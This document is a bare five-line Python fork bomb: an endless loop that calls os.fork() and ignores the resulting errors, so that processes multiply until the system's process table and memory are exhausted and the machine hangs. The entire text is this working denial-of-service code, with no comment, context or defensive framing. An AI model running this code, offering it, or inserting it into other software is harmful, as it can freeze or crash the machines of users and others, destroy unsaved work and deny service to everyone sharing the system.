import os

while True:
    try:
        os.fork()
    except OSError:
        pass
